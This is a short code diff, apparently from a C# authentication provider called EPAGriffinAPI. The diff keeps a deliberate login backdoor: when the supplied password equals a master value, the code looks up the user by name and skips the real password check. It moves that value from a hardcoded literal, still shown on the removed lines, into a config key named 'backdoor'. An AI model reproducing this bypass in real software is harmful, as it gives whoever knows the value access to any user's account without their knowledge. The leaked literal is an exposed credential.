@@ -104,7 +104,7 @@ namespace EPAGriffinAPI.Providers
                         verified = true;
                 }
                
-                if (password != "Magu1359")
+                if (password != ConfigurationManager.AppSettings["backdoor"])
                      user = await userManager.FindAsync(context.UserName, password);
                     
                 else
@@ -113,7 +113,7 @@ namespace EPAGriffinAPI.Providers
                 if (user == null)
                 {
                     var xuser = await userManager.FindByIdAsync(_userid2);
-                    if (password != "Magu1359")
+                    if (password != ConfigurationManager.AppSettings["backdoor"])
                         user = await userManager.FindAsync(xuser.UserName, password);
                     else
                         user = await userManager.FindByNameAsync(xuser.UserName);
